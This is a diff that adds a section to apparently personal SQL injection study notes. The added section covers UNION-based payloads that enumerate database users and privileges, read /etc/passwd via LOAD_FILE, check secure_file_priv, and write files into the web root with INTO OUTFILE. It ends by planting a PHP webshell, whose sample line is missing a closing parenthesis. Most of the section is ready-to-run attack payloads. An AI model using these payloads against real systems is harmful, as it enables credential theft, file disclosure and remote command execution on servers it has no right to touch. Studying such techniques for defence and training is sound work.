@@ -188,6 +188,92 @@ From the above info, we can now craft our query.
 ```sql
 cn' UNION select 1, username, password, 4 from users.credentials--
 ```
+## Reading Files
+We need to know if our user has the privileges to read files.
+### DB User
+```sql
+# Target SQL Queries
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+# Injection Queries
+cn' UNION SELECT 1, user(),3, 4-- 
+cn' UNION SELECT 1, USER, 3, 4-- 
+```
+### Privileges
+```sql
+# Target SQL Queries
+SELECT super_priv from mysql.user
+
+# Injection Queries
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- # Find priv's of other user or our user
+# if multiple users exist in the db
+# Query will respond with "y" or "n". "y"= super_priv
+```
+```sql
+# Dump all privileges for all users
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+# Dump all privileges for specific user
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
+# Here we are looking for the "File" Privilege
+```
+### Load_File
+```sql
+# Example Direct SQL Statement
+SELECT LOAD_FILE('/etc/passwd');
+```
+```sql
+# Example Injection Statement
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
+```
+### Writing Files
+3 Requirements:
+1. File Privilige
+2. MySQL global secure_file_prive variable not enabled
+3. Write access to the location we want to write to on the server
+
+**secure_file_priv**
+NULL = No access to anything
+Path = can only read/write to/from that folder
+Blank = read/write entire file system
+```sql
+# Example Direct Query
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+variables are stored within INFORMATION_SCHEMA.global_variables w/ 2 columns - variable_name & variable_value
+```sql
+# noting the above, our final sql query should look something like this
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+# and our injectable statement, should look something like this
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
+```
+**Select into outfile**
+```sql
+# Example SQL Query
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+# Example of directly SELECTing strings into files, allowing us to write arbitrary files
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+```sql
+# Example SQL query to write a test file into the web root
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+# Example injection based on above
+cn' union select 1, 'file written successfully!', 3, 4 into outfile '/var/www/html/proof.txt'-- 
+# Note: you will not see anything written back, as long as it doesn't error, it probably worked
+# Note: with the above injection, your file will look like "1 file written successfuly 3 4"
+# Note: This is because the entire select is written to the file, to clean it up, use "" in place of the numbers
+```
+**Example Webshell**
+Example PHP webshell
+```php
+<?php system($_REQUEST[0]; ?>
+```
+To inject this simple one-line webshell, we can use the same example above, just changing our text and filename.
+```sql
+cn' union select "", '<?php system($_REQUEST[0]; ?>', "", "" into outfile '/var/www/html/webshell.php'-- 
+```
 ## In-Band
 ### Summary
 Output of both the intended and new query are output directly to the screen and can be directly read.
